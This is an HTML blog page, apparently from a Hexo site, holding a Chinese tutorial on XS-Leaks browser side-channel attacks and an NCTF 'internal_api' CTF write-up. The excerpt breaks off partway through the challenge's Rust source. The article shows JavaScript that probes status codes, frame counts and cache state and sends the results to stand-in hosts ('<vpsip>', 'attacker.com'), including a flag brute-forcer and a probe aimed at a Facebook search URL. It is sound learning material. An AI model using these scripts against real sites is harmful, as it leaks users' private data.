@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="夏饭orz">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="夏饭orz">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="冒险者，欢迎光临🌹">
+    <meta name="description" content="原理：网页前端侧信道攻击，常见侧信道如下:  浏览器的 api (e.g. Frame Counting and Timing Attacks) 浏览器的实现细节和 bugs (e.g. Connection Pooling and typeMustMatch) 硬件 bugs (e.g. Speculative Execution Attacks 4)  利用条件： 模糊查找 受害者可执行js代">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSleak">
+<meta property="og:url" content="http://example.com/2025/06/22/XS-Leaks/index.html">
+<meta property="og:site_name" content="夏饭の小饭堂">
+<meta property="og:description" content="原理：网页前端侧信道攻击，常见侧信道如下:  浏览器的 api (e.g. Frame Counting and Timing Attacks) 浏览器的实现细节和 bugs (e.g. Connection Pooling and typeMustMatch) 硬件 bugs (e.g. Speculative Execution Attacks 4)  利用条件： 模糊查找 受害者可执行js代">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/images/91f34034-ac14-410c-9327-3506f1c79b5e.png">
+<meta property="article:published_time" content="2025-06-22T06:30:00.000Z">
+<meta property="article:modified_time" content="2025-06-22T15:29:43.904Z">
+<meta property="article:author" content="夏饭orz">
+<meta property="article:tag" content="web漏洞">
+<meta property="article:tag" content="侧信道">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/91f34034-ac14-410c-9327-3506f1c79b5e.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/taco-truck.png">
+    <title>XSleak · 夏饭の小饭堂</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">夏饭の小饭堂.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">夏饭の小饭堂.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">XSleak</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/54_i12.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                XSleak
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="web漏洞">web漏洞</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="侧信道">侧信道</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/06/22</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>网页前端侧信道攻击，常见侧信道如下:</p>
+<ul>
+<li>浏览器的 api (e.g. <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/frame-counting/">Frame Counting</a> and <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/timing-attacks/">Timing Attacks</a>)</li>
+<li>浏览器的实现细节和 bugs (e.g. <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">Connection Pooling</a> and <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/historical/content-type/#typemustmatch">typeMustMatch</a>)</li>
+<li>硬件 bugs (e.g. Speculative Execution Attacks <a target="_blank" rel="noopener" href="https://xsleaks.dev/#fn:4">4</a>)</li>
+</ul>
+<h1 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h1><ul>
+<li>模糊查找</li>
+<li>受害者可执行js代码</li>
+<li>二元结果</li>
+</ul>
+<h1 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h1><p>确定要泄露的信息→信息可以通过模糊查找→正确&#x2F;错误可以被判断→可以写出泄露&amp;外带脚本→有bot&#x2F;第三方<strong>访问</strong>目标页面(受害者可执行js代码)→触发代码执行，得到结果</p>
+<h1 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h1><h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>访问某网站，成功返回200，失败返回500</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">probeError</span>(<span class="params">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> url = <span class="string">&#x27;http://127.0.0.1:8000/internal/search?s=&#x27;</span> + flag;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">src</span> = url;</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//当验证成功时，将 flag 通过 fetch 发送到接收服务器</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://&lt;vpsip&gt;/?flag=&#x27;</span> + flag, &#123; <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span> &#125;);</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">leak</span>(flag);</span></span><br><span class="line"><span class="language-javascript">        script.<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> script.<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//构造&lt;script src=url onload=fetch…… onerror=script.remove()&gt;,访问成功(200)执行onload，失败(500)移除script</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> dicts = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dicts.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> char = dicts[i];</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">probeError</span>(flag + char);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">leak</span>(<span class="string">&#x27;nctf&#123;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="XS-Search"><a href="#XS-Search" class="headerlink" title="XS-Search"></a>XS-Search</h2><ul>
+<li>frames 的數量</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://www.facebook.com/search/str/chen/users-named/me/friends/intersect&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//会显示名字中有chen的结果,如果有frame为1,没有则为0</span></span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (win.<span class="property">frames</span>.<span class="property">length</span> === <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com/?result=no&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com/?result=yes&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    win.<span class="title function_">close</span>()</span></span><br><span class="line"><span class="language-javascript">  &#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>cache probing</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 程式碼改寫自 https://github.com/xsleaks/xsleaks/wiki/Browser-Side-Channels#cache-and-error-events</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> url = <span class="string">&#x27;https://app.huli.tw/found.png&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 這行可以在 URL 後面加上一堆逗號，送出去的 request 的 referrer 就會太大</span></span></span><br><span class="line"><span class="language-javascript">history.<span class="title function_">replaceState</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="title class_">Array</span>(<span class="number">16e3</span>));</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span></span><br><span class="line"><span class="language-javascript">img.<span class="property">src</span> = url;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r, e</span>)=&gt;</span>&#123;img.<span class="property">onerror</span>=e;img.<span class="property">onload</span>=r;&#125;);</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&#x27;Resource was cached&#x27;</span>); <span class="comment">// Otherwise it would have errored out</span></span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&#x27;Resource was not cached&#x27;</span>); <span class="comment">// Otherwise it would have loaded</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//如果图片没有在缓存中,服务器就会发request去拿,但是会由于referer太长而报错,触发e,是缓存清除;如果在缓存中就不会发request,会触发r</span></span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>img</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://1.png&quot;</span> <span class="attr">onerror</span>=<span class="string">e</span> <span class="attr">onload</span>=<span class="string">r</span>&gt;</span></span><br><span class="line">//如果图片没有加载则e,加载了则r</span><br><span class="line">//可以用来探测用户是否登录了某网站</span><br></pre></td></tr></table></figure>
+
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题:"></a>例题:</h1><h2 id="NCTF-internal-api"><a href="#NCTF-internal-api" class="headerlink" title="[NCTF]internal_api"></a>[NCTF]internal_api</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">report</span>(<span class="title function_ invoke__">Form</span>(report): Form&lt;Report&gt;) <span class="punctuation">-&gt;</span> Json&lt;Value&gt; &#123;</span><br><span class="line">    task::<span class="title function_ invoke__">spawn</span>(<span class="keyword">async</span> <span class="keyword">move</span> &#123; bot::<span class="title function_ invoke__">visit_url</span>(report.url).<span class="keyword">await</span>.<span class="title function_ invoke__">unwrap</span>() &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Json</span>(json!(&#123;</span><br><span class="line">        <span class="string">&quot;message&quot;</span>: <span class="string">&quot;bot will visit the url soon&quot;</span></span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用rot访问 url</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">public_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">pool</span> = pool.<span class="title function_ invoke__">clone</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">false</span>)?;</span><br><span class="line"><span class="comment">//用户搜索非隐藏comment</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">private_search</span>(</span><br><span class="line">    <span class="title function_ invoke__">Query</span>(search): Query&lt;Search&gt;,</span><br><span class="line">    <span class="title function_ invoke__">State</span>(pool): State&lt;Arc&lt;DbPool&gt;&gt;,</span><br><span class="line">    <span class="title function_ invoke__">ConnectInfo</span>(addr): ConnectInfo&lt;SocketAddr&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Json&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;, AppError&gt; &#123;</span><br><span class="line">    <span class="comment">// 以下两个 if 与题目无关, 你只需要知道: private_search 路由仅有 bot 才能访问</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bot_ip</span> = tokio::net::<span class="title function_ invoke__">lookup_host</span>(<span class="string">&quot;bot:4444&quot;</span>).<span class="keyword">await</span>?.<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">if</span> addr.<span class="title function_ invoke__">ip</span>() != bot_ip.<span class="title function_ invoke__">ip</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;only bot can access&quot;</span>).<span class="title function_ invoke__">into</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">conn</span> = pool.<span class="title function_ invoke__">get</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = db::<span class="title function_ invoke__">search</span>(conn, search.s, <span class="literal">true</span>)?;</span><br><span class="line"><span class="comment">//rot可以搜索隐藏comment</span></span><br><span class="line"><span class="keyword">if</span> comments.<span class="title function_ invoke__">len</span>() &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="title function_ invoke__">Json</span>(comments))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(anyhow!(<span class="string">&quot;No comments found&quot;</span>).<span class="title function_ invoke__">into</span>())</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果搜寻到返回200，如果没有就返回500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//db.rust</span></span><br><span class="line"><span class="keyword">for</span> <span class="variable">comment</span> <span class="keyword">in</span> comments &#123;</span><br><span class="line">        conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">            <span class="string">&quot;INSERT INTO comments(content, hidden) VALUES(?, ?)&quot;</span>,</span><br><span class="line">            params![comment, <span class="literal">false</span>], <span class="comment">// 普通评论标记为非隐藏</span></span><br><span class="line">        )?;</span><br><span class="line">    &#125;</span><br><span 